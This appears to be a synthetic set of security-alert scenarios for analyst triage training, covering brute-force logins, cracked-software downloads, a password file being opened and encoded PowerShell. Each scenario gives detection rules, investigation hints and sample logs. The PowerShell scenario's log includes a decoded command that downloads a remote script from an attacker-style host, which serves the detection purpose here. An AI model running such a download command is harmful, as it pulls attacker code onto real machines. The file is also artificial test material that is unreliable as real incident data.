name: Multiple Failed Logins
description: More than five failed login attempts were observed against the same user within two minutes.
rule: IF failed_logins > 5 in 2 minutes THEN trigger high-severity brute force alert
hints: Check source IP reputation and geolocation.
Verify whether the target user normally logs in from this network.
Look for successful login immediately after the failed attempts.
Review authentication logs for password spraying against other users.

logs.raw_log: auth gw01 src=203.0.113.45 dst=10.20.1.14 user=jdelacruz action=login_attempt status=failed reason=bad_password
auth gw01 src=203.0.113.45 dst=10.20.1.14 user=jdelacruz action=login_attempt status=failed reason=bad_password
auth gw01 src=203.0.113.45 dst=10.20.1.14 user=jdelacruz action=login_attempt status=failed reason=bad_password
auth gw01 src=203.0.113.45 dst=10.20.1.14 user=jdelacruz action=login_attempt status=failed reason=bad_password
rule=multiple_failed_logins count=8 window=120s user=jdelacruz src=203.0.113.45 severity=high

name: Cracked Games and Office Crack Download
description: Adrian Naoe downloaded cracked game and Microsoft Office activation files whose SHA-256 hashes matched threat intelligence indicators.
rule: IF downloaded_file_hash IN threat_intel_hashes AND file_name indicates cracked software THEN trigger high-severity malware delivery alert

threat_intel_matches.classification: Suspicious AutoKMS / illegal Microsoft activation tool

hints: Confirm both SHA-256 values against threat intelligence.
Interview Adrian Naoe about cracked game and Office activator downloads.
Check whether setup.exe or KMSAuto Net.exe executed or spawned child processes.
Inspect proxy, EDR, and DNS logs for additional cracked-software indicators.

logs.raw_log: proxy src=10.20.8.55 dst=198.51.100.77 user=adrian.naoe display_name="Adrian Naoe" url=/games/fps-crack/setup.exe bytes=10025920
edr host=FIN-LT-044 user=adrian.naoe display_name="Adrian Naoe" path=C:\Users\adrian.naoe\Downloads\setup.exe sha256=ba80c6caa66fd19d21c1d2d2883173c88df22352761e775106e5dc9d0fa33144
ti_lookup user=adrian.naoe sha256=ba80c6caa66fd19d21c1d2d2883173c88df22352761e775106e5dc9d0fa33144 verdict=malicious family=GameHack source=threat_intel
proxy src=10.20.8.55 dst=203.0.113.88 user=adrian.naoe display_name="Adrian Naoe" url=/office2024/KMSAuto%20Net.exe sha256=3c56387a047564ab68443d8c2f9f427933d5caa09354b60ebf1879a3f3862ceb

rule=cracked_software_malicious_hash host=FIN-LT-044 user=adrian.naoe display_name="Adrian Naoe" hashes=ba80c6caa66fd19d21c1d2d2883173c88df22352761e775106e5dc9d0fa33144,3c56387a047564ab68443d8c2f9f427933d5caa09354b60ebf1879a3f3862ceb severity=high

name: Password File Opened
description: Adrian Naoe opened a file named passwords.xlsx from the Documents folder, indicating possible exposure of stored credentials.
rule: IF file_open path matches *password* OR *credentials* THEN trigger high-severity credential exposure alert
hints: Confirm whether passwords.xlsx contains real credentials.
Check file access history and whether the file was copied, uploaded, or emailed.
Identify accounts listed in the file and rotate exposed credentials.
Review endpoint activity before and after the file open event.

logs.raw_log: edr host=FIN-LT-044 user=adrian.naoe display_name="Adrian Naoe" action=directory_listing path=C:\Users\adrian.naoe\Documents
edr host=FIN-LT-044 user=adrian.naoe display_name="Adrian Naoe" action=file_open path=C:\Users\adrian.naoe\Documents\passwords.xlsx
edr host=FIN-LT-044 user=adrian.naoe process=EXCEL.EXE file=C:\Users\adrian.naoe\Documents\passwords.xlsx
windows event=network_share_access src=10.20.8.55 dst=10.20.30.21 user=adrian.naoe share=\\10.20.30.21\Finance
rule=password_file_opened host=FIN-LT-044 user=adrian.naoe display_name="Adrian Naoe" sensitive_file=C:\Users\adrian.naoe\Documents\passwords.xlsx severity=high

name: Suspicious PowerShell Execution
description: Base64 encoded PowerShell execution was detected on an endpoint.
rule: IF base64 encoded PowerShell detected THEN trigger medium-severity script execution alert
hints: Decode the PowerShell command and identify its intent.
Check parent process and whether the user launched it interactively.
Look for outbound network connections after execution.
Search for lateral movement or credential access on the endpoint.

logs.raw_log: edr host=OPS-WS-019 parent=winword.exe process=powershell.exe args=-NoP -EncodedCommand SQBFAFgA
scriptblock decoded="Invoke-WebRequest -Uri hxxp://203.0.113.90/a.ps1 -OutFile $env:TEMP\a.ps1"
netflow src=10.20.12.30 dst=203.0.113.90 dport=443 process=powershell.exe
windows event=network_logon_attempt src=10.20.12.30 dst=10.20.40.12 user=admin status=failed
rule=suspicious_powershell_execution host=OPS-WS-019 encoded_command=true severity=medium
